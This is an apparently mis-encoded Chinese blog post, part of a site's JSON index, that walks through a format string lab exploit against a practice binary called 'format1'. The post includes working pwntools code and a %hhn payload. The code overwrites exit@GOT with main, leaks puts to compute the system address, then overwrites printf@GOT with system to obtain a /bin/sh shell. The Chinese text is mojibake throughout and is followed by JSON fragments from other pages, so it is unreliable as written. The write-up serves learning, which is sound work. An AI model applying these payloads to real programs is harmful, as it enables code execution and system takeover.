¼å¼åŒ–å­—ç¬¦ä¸² æ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ç”±æ™®é€šå­—ç¬¦ä¸²å’Œæ ¼å¼åŒ–è§„å®šå­—ç¬¦æ„æˆçš„å­—ç¬¦åºåˆ—ï¼š\næ™®é€šå­—ç¬¦è¢«åŸå°ä¸åŠ¨åœ°å¤åˆ¶åˆ°è¾“å‡ºæµä¸­ï¼› æ ¼å¼åŒ–è§„å®šå­—ç¬¦åˆ™æ˜¯ä»¥%å¼€å§‹ï¼Œç”¨æ¥ç¡®å®šè¾“å‡ºå†…å®¹æ ¼å¼ï¼› åŸºæœ¬æ ¼å¼\n%[parameter][flags][fieldwidth][.precision][length]type\nparameter\nå¯ä»¥å¿½ç•¥æˆ–è€…æ˜¯n$ï¼Œnè¡¨ç¤ºæ˜¯å‚æ•°åˆ—è¡¨çš„ç¬¬nä¸ªå‚æ•°ï¼Œé€šè¿‡è¿™ç§å½¢å¼ç›´æ¥è®¿é—®ç¬¬nä¸ªå‚æ•°ï¼› flags\nç”¨äºè°ƒæ•´è¾“å‡ºå’Œæ‰“å°çš„ç¬¦å·ã€ç©ºç™½ã€å°æ•°ç‚¹ã€å…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶å‰ç¼€ç­‰ï¼› fieldwidth\né™åˆ¶æ˜¾ç¤ºæ•°å€¼çš„æœ€å°å®½åº¦ï¼Œå½“è¾“å‡ºå­—ç¬¦ä¸ªæ•°ä¸è¶³é™åˆ¶çš„å®½åº¦æ—¶ï¼Œé»˜è®¤ç”¨ç©ºæ ¼å¡«å……ï¼Œæˆ–è€…flagsä¸­çš„å…¶ä»–å¡«å……æ–¹å¼ï¼Œè¶…è¿‡é™åˆ¶å®½åº¦ä¸ä¼šæˆªæ–­ï¼Œæ­£å¸¸æ˜¾ç¤ºï¼› precision\nè¾“å‡ºçš„æœ€å¤§é•¿åº¦ï¼› length\næŒ‡æµ®ç‚¹å‹å‚æ•°æˆ–è€…æ•´å½¢å‚æ•°çš„é•¿åº¦ï¼› hhï¼š1-byteï¼› hï¼š2-byteï¼› lï¼š4-byteï¼› llï¼š8-byteï¼› type\nè½¬æ¢è¯´æ˜ç¬¦ï¼Œç”¨æ¥è¯´æ˜æ‰€åº”ç”¨çš„è½¬æ¢ç±»å‹ï¼Œå®ƒæ˜¯å”¯ä¸€å¿…é¡»çš„æ ¼å¼åŸŸï¼›\n| å­—ç¬¦ | æè¿° | | â€”â€” | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” | | d/i | æœ‰ç¬¦å·åè¿›åˆ¶æ•´æ•° | | u | æ— ç¬¦å·åè¿›åˆ¶æ•´æ•° | | x/X | ä»¥åå…­è¿›åˆ¶å½¢å¼è¾“å‡ºæ— ç¬¦å·æ•´æ•°(ä¸è¾“å‡ºå‰ç¼€0x) | | o | ä»¥å…«è¿›åˆ¶å½¢å¼è¾“å‡ºæ— ç¬¦å·æ•´æ•°(ä¸è¾“å‡ºå‰ç¼€0) | | s | å­—ç¬¦ä¸² | | c | å­—ç¬¦ | | p | æŒ‡é’ˆ | | n | ä¸è¾“å‡ºå­—ç¬¦ï¼ŒæŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ | | f/F | ä»¥å°æ•°å½¢å¼è¾“å‡ºå•ã€åŒç²¾åº¦å®æ•° | | e/E | ä»¥æŒ‡æ•°å½¢å¼è¾“å‡ºå•ã€åŒç²¾åº¦å®æ•° | | g/G | ä»¥%f%eä¸­è¾ƒçŸ­çš„è¾“å‡ºå®½åº¦è¾“å‡ºå•ã€åŒç²¾åº¦å®æ•°ï¼Œ%eæ ¼å¼åœ¨æŒ‡æ•°å°äº-4æˆ–è€…å¤§äºç­‰äºç²¾åº¦æ—¶ä½¿ç”¨ | | a/A | æµ®ç‚¹æ•°ã€åå…­è¿›åˆ¶æ•°å­—å’Œp-è®¡æ•°æ³• |\n0x03 æ¼æ´åŸç† æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ˜¯æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ¥è¿›è¡Œè§£æçš„ï¼Œé‚£ä¹ˆç›¸åº”çš„è¦è¢«è§£æçš„å‚æ•°çš„ä¸ªæ•°ä¹Ÿè‡ªç„¶æ˜¯ç”±è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰€æ§åˆ¶ï¼›\næ ¹æ®cdeclçš„è°ƒç”¨çº¦å®šï¼Œåœ¨è¿›å…¥printf()å‡½æ•°ä¹‹å‰ï¼Œå°†å‚æ•°ä»å³åˆ°å·¦ä¾æ¬¡å‹æ ˆã€‚è¿›å…¥printf()ä¹‹å,å‡½æ•°é¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸€æ¬¡è¯»å–ä¸€ä¸ªå­—ç¬¦ã€‚å¦‚æœå­—ç¬¦ä¸æ˜¯%ï¼Œå­—ç¬¦ç›´æ¥å¤åˆ¶åˆ°è¾“å‡ºä¸­ï¼›å¦åˆ™ï¼Œè¯»å–ä¸‹ä¸€ä¸ªéç©ºå­—ç¬¦ï¼Œè·å–ç›¸åº”çš„å‚æ•°å¹¶è§£æè¾“å‡ºã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ä¸åé¢å®é™…æä¾›çš„æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå°±ä¸ä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤šåŠ å‡ ä¸ªæ ¼å¼åŒ–å­—ç¬¦çš„æ—¶å€™ï¼Œç¨‹åºä¼šæ€ä¹ˆåŠå‘¢ï¼Ÿæ­¤æ—¶å…¶å¯ä»¥æ­£å¸¸é€šè¿‡ç¼–è¯‘ï¼Œå¹¶ä¸”åœ¨æ ˆä¸Šå–å€¼ï¼ŒæŒ‰ç…§ç»™çš„æ ¼å¼åŒ–å­—ç¬¦æ¥è§£æå¯¹åº”æ ˆä¸Šçš„å€¼ï¼Œå‘ç”Ÿäº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚\n0x04 æ¼æ´åˆ†æ åˆ†æ ç”¨IDAProå¯¹format1ç¨‹åºè¿›è¡Œåˆ†æï¼Œç¨‹åºé€»è¾‘ç®€å•ï¼Œåœ¨mainå‡½æ•°ä¸­è°ƒç”¨äº†getnameå‡½æ•° æŸ¥çœ‹getname()å‡½æ•°ï¼Œè¯»å–ç”¨æˆ·è¾“å…¥ï¼Œå‘ç°print(buf)å°†ç”¨æˆ·è¾“å…¥è¿›è¡Œæ‰“å°ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ ç”±äºç¨‹åºç¼–è¯‘æ—¶ä¼šé‡‡ç”¨ä¸¤ç§è¡¨è¿›è¡Œè¾…åŠ©ï¼Œä¸€ä¸ªä¸ºPLTè¡¨ï¼Œä¸€ä¸ªä¸ºGOTè¡¨ï¼Œè¿™ä¸¤ä¸ªè¡¨æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œçœ‹åˆ°å¸¦æœ‰**@plt**æ ‡å¿—çš„å‡½æ•°æ—¶ï¼Œè¿™ä¸ªå‡½æ•°å…¶å®å°±æ˜¯ä¸ªè¿‡æ¸¡ä½œç”¨ï¼Œå¯ä»¥é€šè¿‡PLTè¡¨è·³è½¬åˆ°GOTè¡¨æ¥å¾—åˆ°å‡½æ•°çœŸæ­£çš„åœ°å€ï¼š åˆ©ç”¨æ€è·¯ å°†exitå‡½æ•°çš„GOTè¡¨åœ°å€è¦†å†™ä¸ºmainå‡½æ•°çš„åœ°å€ï¼Œç¨‹åºæ¯æ¬¡é€€å‡ºæ—¶å°†å†è¿”å›åˆ°mainå‡½æ•°ï¼› é€šè¿‡printfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè·å–putså‡½æ•°åœ°å€ï¼Œå†é€šè¿‡libcçš„ç›¸å¯¹åœ°å€åç§»è·å–systemçš„åœ°å€ï¼› ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå°†systemå‡½æ•°åœ°å€è¦†ç›–GOTè¡¨ä¸­printfå‡½æ•°çš„åœ°å€ï¼Œå¹¶åœ¨buf ä¸­å†™å…¥/bin/shï¼Œå½“æ‰§è¡Œprintf(buf)æ—¶ï¼Œç›¸å½“äºæ‰§è¡Œsystem('/bin/sh')ï¼› åˆ©ç”¨è¿‡ç¨‹ å°†exitå‡½æ•°çš„GOTè¡¨åœ°å€è¦†ç›–ä¸ºmainå‡½æ•°åœ°å€ å°†exitå‡½æ•°çš„GOTè¡¨åœ°å€è¦†å†™ä¸ºmainå‡½æ•°çš„åœ°å€ï¼Œæ¯æ¬¡é€€å‡ºæ—¶å°†å†è¿”å›åˆ°mainå‡½æ•°ã€‚ ï¶å…ˆè§£å†³æ„å»ºprintfï¼ˆformatï¼Œ[argument]ï¼‰ä¸­formatå’Œargument\nformatè¦†å†™çš„æ ¼å¼ä¸ºï¼š% width c % num $ hhn\nwidthæ˜¯å°†è¦å†™å…¥åˆ°$hhnå‚æ•°ä¸­çš„å€¼ï¼Œå®ƒç”±è¦†å†™çš„å€¼å’Œå·²ç»å†™å…¥çš„é•¿åº¦å†³å®šï¼Œå…·ä½“ä¸ºï¼šï¼ˆå·²å†™å…¥çš„é•¿åº¦-è¦†å†™çš„å€¼ï¼‰%0x80 æ ¹æ®åæ±‡ç¼–å¯ä»¥çœ‹åˆ°bufæ•°ç»„çš„é•¿åº¦ä¸º0x80 numå®šäº†è¦å†™å…¥çš„ç¬¬numä¸ªå‚æ•°ï¼Œé€šè¿‡è°ƒè¯•å…·ä½“åˆ†æä¸€ä¸‹ è¿™é‡Œç»™å‡ºä¸¤ç§æ–¹æ³•\nç”¨gdbè°ƒè¯•\nåœ¨mainå’Œprintfå¤„è®¾ç½®æ–­ç‚¹ã€‚ ç„¶åè¿è¡Œç¨‹åºï¼Œè¿è¡Œåˆ°printfåœ°æ–¹ bufçš„åœ°å€ä¸º0xffffd12c,æ˜¯printfä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬7ä¸ªå‚æ•°:å³(0xffffd12c - 0xffffd110 ) / 4 = 7 é€šè¿‡pwntoolsè¿›è¡ŒæŸ¥æ‰¾\nç®€å•çš„exp:\n1 2 3 4 5 6 7 8 from pwn import * context.log_level=\u0026#39;debug\u0026#39; p = process(\u0026#39;./format1\u0026#39;) payload = b\u0026#39;a\u0026#39; * 4 + b\u0026#39; \u0026#39; + b\u0026#39; %08x\u0026#39; * 20 print(payload) p.sendline(payload) p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) è¿è¡Œç»“æœå¦‚ä¸‹\næ˜æ˜¾çš„çœ‹åˆ°0x61616161å³ä¸ºç¬¬ä¸ƒä¸ªå‚æ•° numçš„ç¡®å®š\nå› ä¸ºè¦æŠŠexitçš„GOTåœ°å€è¦†å†™ä¸ºmainå‡½æ•°åœ°å€ï¼Œå³0x8048648ï¼Œæ‰€ä»¥åº”å†™å…¥å››ä¸ªå­—èŠ‚ï¼Œå³é‡å¤å››æ¬¡% width c % num $ hhnï¼› ç²—ç•¥ä¼°è®¡widthæœ€å¤šå ç”¨3ä¸ªå­—èŠ‚ï¼Œnumæœ€å¤šå ç”¨2ä¸ªå­—èŠ‚ï¼Œåˆ™æ¯ä¸ªæ ¼å¼% widthc % num $ hhnå ç”¨12ä¸ªå­—èŠ‚ï¼Œå››æ¬¡é‡å¤å…±48ä¸ªå­—èŠ‚ï¼Œå ç”¨48/4=12ä¸ªå‚æ•°ï¼› ç”±äºbufæ˜¯ä»ç¬¬7ä¸ªå‚æ•°å¼€å§‹ï¼Œå†™å…¥çš„åœ°å€ä»ç¬¬7+12=19ä¸ªå‚æ•°å¼€å§‹ï¼Œnumä¾æ¬¡ä¸º19ã€20ã€21ã€22ï¼› ç¡®å®šexit@gotçš„åœ°å€ï¼›\nè¿™é‡ŒåŒæ ·ç»™å‡ºä¸¤ç§æ–¹æ³• gdbæŸ¥çœ‹åæ±‡ç¼–æŒ‡ä»¤ å…ˆdisass mainæŸ¥çœ‹mainå‡½æ•°åœ°å€ å‘ç°exit@pltçš„åœ°å€ä¸º0x8048480 ç„¶åæŸ¥çœ‹disass 0x8048480çš„åæ±‡ç¼–ï¼Œå³è¿›å…¥exit@pltçš„å‡½æ•°å†…éƒ¨ jmpæ‰€å¯¹åº”çš„çš„åœ°å€å³ä¸ºexit@got ä¸º 0x804a024 ç›´æ¥å€Ÿç”¨gdbä¸­çš„gotå‘½ä»¤ exit@got ä¸º 0x804a024 mainå‡½æ•°åœ°å€\nç¬¬ä¸€æ¡å³ä¸ºmainå‡½æ•°åœ°å€ ï¼š 0x08048648 æ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²:\nç¡®å®šäº†numå’Œwidthï¼Œä¹Ÿç¡®å®šäº†exitå‡½æ•°çš„gotè¡¨åœ°å€ä¸º0x804a024ï¼Œæ‰€ä»¥å°†è¦è¦†ç›–çš„exit@gotåœ°å€0x804a024ã€0x804a025ã€0x804a026ã€0x804a027ä¾æ¬¡å†™å…¥åˆ°ç¬¬19ã€20ã€21ã€22ä¸ªå‚æ•°ä¸­ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å°±æ„é€ å¥½äº†ï¼š\n1 %72c%19$hhn%62c%20$hhn%126c%21$hhn%4c%22$hhnaaaa\\x24\\xa0\\x04\\x08\\x25\\xa0\\x04\\x08\\x26\\xa0\\x04\\ x08\\x27\\xa0\\x04\\x08 ç¼–å†™generate_format(addr, value)å‡½æ•°æ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œaddrä¸ºè¦è¦†å†™çš„åœ°å€ï¼Œvalueä¸ºè¦†å†™çš„å€¼ï¼Œå‡½æ•°ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def generate_format(addr,value): payload=\u0026#39;\u0026#39; # å·²å†™å…¥çš„é•¿åº¦ print_count = 0 addr_part = \u0026#39;\u0026#39; # range 4 çš„åŸå› æ˜¯ åœ°å€ä¸ºå››ä¸ªå­—èŠ‚ï¼Œå››ä¸ªå¾ªç¯å³å¯ç»“æŸã€‚ for i in range(4): if value \u0026gt;\u0026gt; (8*i) == 0: break one_byte = (value \u0026gt;\u0026gt; (8*i)) \u0026amp; 0xff # 0x100çš„åŸå›  é˜²æ­¢å‡ºç°è´Ÿæ•° payload += \u0026#39;%{0}c%{1}$hhn\u0026#39;.format((one_byte - print_count + 0x100) % 0x100,19+i) print_count += (one_byte - print_count) % 0x100 addr_part += p32(addr+i).decode(\u0026#39;unicode_escape\u0026#39;) payload = payload.ljust((12)*4,\u0026#39;a\u0026#39;) payload += addr_part return payload è°ƒç”¨generate_format(exit_got,main)å‡½æ•°ï¼Œç”Ÿæˆçš„payloadä½œä¸ºè¾“å…¥ï¼Œæ‰§è¡Œåå¯ä»¥çœ‹åˆ°exitçš„gotè¡¨çš„ç¬¬ä¸€ä¸ªåœ°å€è¢«è¦†ç›–ä¸ºmainå‡½æ•°çš„åœ°å€ï¼Œå³0x08048648ï¼› è·å–systemçš„åœ°å€ è·å–æ€è·¯åˆ†æ\nç”±äºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´èƒ½å¤Ÿæ³„éœ²å†…å­˜å…³é”®æ•°æ®ï¼Œå¯ä»¥è€ƒè™‘åˆ©ç”¨è¿™ä¸ªæ¼æ´æ³„éœ²system çš„åœ°å€ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæ³„éœ²å‡ºGOTè¡¨ä¸­putsçš„åœ°å€ï¼Œå†åˆ©ç”¨libcä¸­systemå‡½æ•°ä¸putså‡½æ•°çš„åç§»ï¼Œè®¡ç®—å‡ºsystemåœ°å€ï¼› å…ˆè·å–putså‡½æ•°çš„gotè¡¨åœ°å€ï¼Œ(è¿™é‡Œä¸ä¸Šé¢çš„æ–¹æ³•ç›¸åŒ)ï¼Œæ‰€ä»¥putså‡½æ•°gotè¡¨çš„åœ°å€ä¸º0x804a01cï¼Œè™½ç„¶å¯ä»¥ç›´æ¥æŸ¥çœ‹0x804a01cå†…å®¹å³å¯å¾—åˆ°putså‡½æ•°çš„å®é™…åœ°å€ï¼Œè¿™é‡Œä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥è·å–ï¼›\næ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²\næ„é€ çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ ¼å¼ä¸ºï¼š%num$s+puts@gotï¼Œå³æŠŠputs@gotçš„åœ°å€å†™å…¥ bufï¼Œå†é€šè¿‡%sè¯»å‡ºï¼› æ­¤æ—¶è¯»å‡ºçš„putsåœ°å€ä¸º putsåœ¨ç¨‹åºä¸­çœŸæ­£è¿è¡Œçš„åœ°å€ å…¶ä¸­%num$så 4ä¸ªå­—èŠ‚ï¼Œæ˜¯ç¬¬7ä¸ªå‚æ•°ï¼›puts@gotå 4ä¸ªå­—èŠ‚ï¼Œæ˜¯ç¬¬8ä¸ªå‚æ•°ï¼Œnumå°±å¯ä»¥å†™ä¸º8ï¼Œå³å°†puts@gotçš„åœ°å€å†™å…¥åˆ°ç¬¬8ä¸ªå‚æ•°çš„ä½ç½®ï¼› è·å–äº†putsçš„å®é™…åœ°å€åï¼Œé€šè¿‡libcä¸­ä¸¤ä¸ªå‡½æ•°çš„åç§»å³å¯å¾—åˆ°systemçš„åœ°å€ï¼Œé€šè¿‡æŸ¥é˜…èµ„æ–™å¯ä»¥å¾—åˆ°libcçš„åº“çš„ä½ç½®ä¸º/lib/i386-linux-gnu/libc.so.6ï¼› æ‰€ä»¥get_sys_addr æœ‰å¦‚ä¸‹ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) puts_got_addr = elf.got[\u0026#34;puts\u0026#34;] payload_puts = \u0026#34;%8$s\u0026#34; + p32(puts_got_addr).decode(\u0026#39;unicode_escape\u0026#39;) p.sendline(payload_puts) p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) puts_addr = u32(p.recv(4)) libc = ELF(\u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34;) offset = libc.symbols[\u0026#39;puts\u0026#39;]-libc.symbols[\u0026#39;system\u0026#39;] sys_addr = puts_addr - offset è¿è¡Œç»“æœ\næ ¹æ®æ¥æ”¶åˆ°çš„å››ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ‹¿åˆ°putsåœ°å€ä¸º0xf7e37cd0,systemåœ°å€ä¸º0xf7e0b830 å°†å…¶æˆ‘ä»¬ç”¨gdbè°ƒè¯•å¾—åˆ°çš„åœ°å€ç›¸æ¯”ï¼Œæ­£ç¡® è¦†å†™got è¡¨ä¸­printfåœ°å€ åŸç†ä¸è¦†å†™exitå‡½æ•°GOTè¡¨ç›¸åŒï¼Œè°ƒç”¨generate_format(printf@got,system_addr)ï¼Œç”Ÿæˆçš„payloadä½œä¸ºè¾“å…¥ï¼Œä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 printf_got = elf.got[\u0026#39;printf\u0026#39;] payload_system = generate_format(printf_got,sys_addr) p.sendline(payload_system) è¿è¡Œä»£ç  å¯ä»¥å‘ç°printf@gotè¢«è¦†ç›–ä¸º0xf7e0b830 æ‰§è¡Œsystem(\u0026rsquo;/bin/sh') æ­¤æ—¶GOTè¡¨ä¸­printfåœ°å€å·²è¢«è¦†å†™ä¸ºsystemåœ°å€ï¼Œåœ¨bufä¸­è¾“å…¥/bin/shï¼Œæ‰§è¡Œprintf(buf)æ—¶ï¼Œç›¸å½“äºæ‰§è¡Œsystem('/bin/sh')ï¼Œæœ€åä»£ç å¦‚ä¸‹:\n1 2 3 4 p.recvuntil(\u0026#34;Welcome~\\n\u0026#34;) p.sendline(\u0026#34;/bin/sh\u0026#34;) p.interactive() è¿è¡Œç¼–å†™çš„pythonä»£ç ï¼ŒæˆåŠŸæ‹¿åˆ°shellæƒé™ï¼›\n0x05 æ€»ç»“ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å†…å­˜æ•°æ®å’Œè¦†å†™å†…å­˜ç†è§£åŠ æ·±ã€‚ Linuxä¸­gotè¡¨å’Œpltè¡¨çš„å…³ç³»è¿›ä¸€æ­¥ç†è§£ã€‚ pwntoolsæŸ¥çœ‹å‡½æ•°å‚æ•°çš„ä½ç½®çš„ä¸€äº›ç”¨æ³• pwntoolså¯ä»¥ç›´æ¥å¯¼å…¥elf,process,libcåº“ ","permalink":"http://www.reus09.top/posts/tech/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","summary":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ 0x01 ç›®çš„ é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æŒæ¡æ³„éœ²å†…å­˜æ•°æ®å’Œè¦†å†™å†…å­˜ã€‚ 0x02 åŸºç¡€çŸ¥è¯† æ ¼å¼åŒ–å‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„ANSI Cå‡½æ•°ï¼Œå®ƒä»¬ä»æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­æå–å‚","title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²"},{"content":"BUPTåœ¨è¯» ç›®å‰å¸Œæœ›æ‰¾åˆ°æ–¹å‘\n","permalink":"http://www.reus09.top/about/","summary":"BUPTåœ¨è¯» ç›®å‰å¸Œæœ›æ‰¾åˆ°æ–¹å‘","title":"About"},{"content":"","permalink":"http://www.reus09.top/links/","summary":"","title":"Links"}]